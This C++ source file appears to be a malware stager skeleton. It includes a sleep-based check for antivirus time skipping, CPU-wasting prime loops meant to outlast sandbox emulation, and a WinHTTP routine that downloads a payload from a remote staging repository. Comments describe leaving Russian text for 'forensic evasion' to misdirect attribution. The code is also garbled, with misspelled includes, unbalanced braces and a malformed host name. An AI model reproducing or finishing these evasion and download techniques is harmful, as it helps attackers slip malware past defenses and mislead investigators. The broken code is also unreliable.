
добро пожаловать, товарищ

//Time Skipping
//Used to see if AV is using time skipping to speed up time to simulate execution
//also does a lot of math to "waste time so AVs can let go
//wasting time and resources with inefficient math is a great way to bypass EV

#include <iostram>
using namespace std;
#include <Windows.h>
#include <chrono>
using namespace std::chrono;
#include <cmath>
#include <winhttp.h>
#include <vector

// link winhttp library
#pragma comment(lib, "winhttp.lib")



int TickleMeElmo() {
    DWORD tick1;
    tick1 =GetTickCount();
    Sleep(2000);
    if((GetTickCount() - tick1) >1980)
      return False;
    else
     return True;
}

bool isPrime(unsigned long long n) {
//reduce efficiency to bog down CPU
     if (n < 2) return false;               // eliminating numbers less than 2
     if n % 2 == 0 && n != 2) return false //reject even numbers except 2
     for (unsigned long long i =3; 
          i <= std::sqrt(n);
          i +=2)
     {
          if (n % i == 0) return false; //if it is divisible, n is not prime
     }
     return true; // if nothing is found return prime
}

void Shart()
{
    unsigned long long count = 0;
    for (unsigned long long i = 0;
        i < 35000000ULL;
        i++ {
        if (isPrime(i)) {
            ++count;
        }
}
std:cout << "found" << count << " primes. " <<std::endl

int main()
{
     cout << "Before Sleep \n";

//A different Way to look for time skipping
    //auto start = high_resolution_clock::now();
//std:Sleep(2000);
//    auto stop = high_resolution_clock::now();
//    auto duration = duration_cast<milliseconds>(stop - start);
//    unsigned int dwDuration = duration.count();
//    if (dw <2000) {
//        cout << "Time Skip Detected";
//        return 0;
//    }

//calls the ticklemeelmos time function

      if (TickleMeElmo() == TRUE) {
         return 0;
      }

//calls the math function
Shart();

cout << "After Sleep";
}

//Instead of Time skipping using CPU heavy algorithm to bog down


//Это основная функция.
//may want to change this to main function
int payload () {

    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		    WINHTTP_NO_PROXY_NAME,
		    WINHTTP_NO_PROXY_BYPASS, 0);
  
  //Retrieves location - note change port if not 443 if you are hosting somewhere else
   HINTERNET hConnect = WinHttpConnect(hSession, L"://github.com/jwfawcett/WindowsStagingProject", INTERNET_DEFAULT_HTTPS_PORT, 0);

  //Retrieves Path
   HINTERNET hRequest = WinHttpOpenRequest(
     hConnect, 
     L"GET",                        // HTTP verb (GET, POST, etc.)
     L"/v1/users",                  // The path part of the URL (use L"/" if none)
     NULL, 
     WINHTTP_NO_REFERER, 
     WINHTTP_DEFAULT_ACCEPT_TYPES, 
     WINHTTP_FLAG_SECURE            // Required for HTTPS
    );

     BOOL bResults = WinHttpSendRequest(hRequest,
		WINHTTP_NO_ADDITIONAL_HEADERS, 0,
		WINHTTP_NO_REQUEST_DATA, 0,
		0, 0);
//Recieves Response
	if (bResults)
		bResults = WinHttpReceiveResponse(hRequest, NULL);

	// iniitalize variables
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	std::vector<char> buffer;
	BOOL bDone = FALSE;

	if (bResults) {
		do {

			dwSize = 0;
			
			if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
				// handle error here.
				break;
			}

			if (dwSize == 0) break;

			buffer.resize(dwSize);

			ZeroMemory(&buffer[0], dwSize);

			if (!WinHttpReadData(hRequest, (LPVOID)&buffer[0], dwSize, &dwDownloaded)) {
				break;
			}
}


//Это мой проект
//Leave Russian Comments for Forensic Evasion
